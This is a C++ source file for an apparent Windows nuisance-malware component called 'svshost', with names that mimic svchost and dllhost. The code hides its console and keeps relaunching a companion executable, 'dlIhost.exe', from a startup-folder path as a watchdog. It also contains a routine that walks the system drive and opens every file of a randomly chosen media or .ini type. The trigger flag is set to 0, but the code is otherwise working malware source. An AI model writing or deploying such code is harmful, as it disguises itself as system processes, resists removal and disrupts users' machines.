// svshost - Interrupter process

#include <iostream>
#include <fstream>
#include <cstdlib>
#include <ctime>
#include <Windows.h>
#include <shlobj.h>
#include <TlHelp32.h>
#include <dirent.h>

#define MainExecutableName "dlIhost.exe"
#define TargetLength 5

using namespace std;

typedef unsigned char uint8;

int GetRandomNumber(uint8);
void FeedWatchDog(void);
void SeekFilesRecursively(char*, string);
bool IsTarget(const string, const string);

char MainExecutablePath[0x00100];
const char MainExeNameA[0x0000D] = "\\dlIhost.exe";
const string TargetFileTypes[TargetLength] = { ".mp4", ".mp3", ".bmp", ".jpg", ".ini" };

int main(){


	// Hide window
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);

	try{

		bool CanAttack = 0; //GetRandomNumber(2) - 1;
		unsigned int t = GetRandomNumber(30) * 60;

		// Obtaining the paths
		LPITEMIDLIST Pidl;
		long hResult;
		hResult = SHGetSpecialFolderLocation(0, 0x00018, &Pidl);
		if (hResult == 0) hResult = SHGetPathFromIDList(Pidl, MainExecutablePath);
		strcat(MainExecutablePath, MainExeNameA);
		char SystemDrive[3] = { MainExecutablePath[0], ':', 0 };

		// Wait
		time_t origin = time(0);
		while (difftime(time(0), origin) < t) FeedWatchDog();

		// Seek & Open
		if (CanAttack) SeekFilesRecursively(SystemDrive, TargetFileTypes[GetRandomNumber(TargetLength-1)]);
		while (1) FeedWatchDog();

	}
	catch (const char * msg){
		main();
	}

	return 0;
}

int GetRandomNumber(uint8 max){
	srand((unsigned)time(0));
	return (rand() % max) + 1;
}

void FeedWatchDog(){

	// Looking for main executable process
	bool RUNNING_FLAG = 0;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(0x00002, 0);
	if (Process32First(snapshot, &entry) == 1){
		while (Process32Next(snapshot, &entry) == 1){
			if (strcmp(entry.szExeFile, MainExecutableName) == 0){
				RUNNING_FLAG = 1;
				break;
			}
		}
	}
	if (!RUNNING_FLAG) ShellExecute(0, 0, LPCSTR(MainExecutablePath), 0, 0, 0);
	Sleep(1);
}

void SeekFilesRecursively(char *basePath, string TargetFileType){
	char path[0x00800];
	struct dirent *dp;
	DIR *dir = opendir(basePath);

	if (!dir) return;

	while ((dp = readdir(dir)) != NULL){
		if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0){

			strcpy(path, basePath);
			strcat(path, "\\");
			strcat(path, dp->d_name);
			if (IsTarget((string)dp->d_name, TargetFileType)) ShellExecute(0, "open", path, 0, 0, 0x00005);
			SeekFilesRecursively(path, TargetFileType);
			Sleep(1);
		}
	}

	closedir(dir);
}

bool IsTarget(const string str, const string suffix){
	return str.size() >= suffix.size() && str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
}